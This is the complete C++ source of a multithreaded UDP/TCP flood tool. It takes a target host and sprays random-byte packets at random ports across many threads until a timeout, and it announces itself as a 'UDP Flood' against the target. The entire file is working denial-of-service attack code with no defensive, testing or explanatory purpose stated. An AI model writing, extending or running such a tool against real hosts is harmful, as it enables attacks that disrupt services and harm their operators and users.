#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <random>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <cstring>

using namespace std;

void flood_worker(string host, bool is_udp, int port_from, int port_to, int packets, int timeout) {
    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> port_dist(port_from, port_to);
    uniform_int_distribution<> data_dist(0, 255);

    vector<char> data(8);
    for (int i = 0; i < 8; ++i) data[i] = static_cast<char>(data_dist(gen));

    auto start_time = chrono::steady_clock::now();

    while (true) {
        int port = port_dist(gen);
        
        struct addrinfo hints;
        memset(&hints, 0, sizeof(hints));
        hints.ai_family = AF_INET;
        hints.ai_socktype = is_udp ? SOCK_DGRAM : SOCK_STREAM;
        hints.ai_protocol = is_udp ? IPPROTO_UDP : IPPROTO_TCP;

        struct addrinfo* result = nullptr;
        string port_str = to_string(port);
        if (getaddrinfo(host.c_str(), port_str.c_str(), &hints, &result) != 0) {
            continue;
        }

        int s = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
        if (s < 0) {
            freeaddrinfo(result);
            continue;
        }

        if (!is_udp) {
            if (connect(s, result->ai_addr, result->ai_addrlen) < 0) {
                close(s);
                freeaddrinfo(result);
                continue;
            }
        }

        for (int i = 0; i < packets; ++i) {
            if (is_udp) {
                sendto(s, data.data(), data.size(), 0, result->ai_addr, result->ai_addrlen);
            } else {
                send(s, data.data(), data.size(), 0);
            }
        }
        
        close(s);
        freeaddrinfo(result);

        auto current_time = chrono::steady_clock::now();
        if (chrono::duration_cast<chrono::seconds>(current_time - start_time).count() > timeout) {
            break;
        }
    }
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        cout << "Usage: " << argv[0] << " <host> [--tcp] [--port-from <min>] [--port-to <max>] [--packets <count>] [--threads <count>] [--timeout <sec>]" << endl;
        return 1;
    }

    string host = argv[1];
    bool use_tcp = false;
    int port_from = 0;
    int port_to = 65535;
    int packets = 1000;
    int threads_count = 1;
    int timeout = 30;

    for (int i = 2; i < argc; ++i) {
        string arg = argv[i];
        if (arg == "--tcp") use_tcp = true;
        else if (arg == "--port-from" && i + 1 < argc) port_from = stoi(argv[++i]);
        else if (arg == "--port-to" && i + 1 < argc) port_to = stoi(argv[++i]);
        else if (arg == "--packets" && i + 1 < argc) packets = stoi(argv[++i]);
        else if (arg == "--threads" && i + 1 < argc) threads_count = stoi(argv[++i]);
        else if (arg == "--timeout" && i + 1 < argc) timeout = stoi(argv[++i]);
    }

    vector<thread> threads;
    cout << "[UDP Flood] Starting " << threads_count << " threads against " << host << " for " << timeout << "s..." << endl;
    for (int i = 0; i < threads_count; ++i) {
        threads.emplace_back(flood_worker, host, !use_tcp, port_from, port_to, packets, timeout);
    }

    for (auto& t : threads) {
        t.join();
    }

    return 0;
}
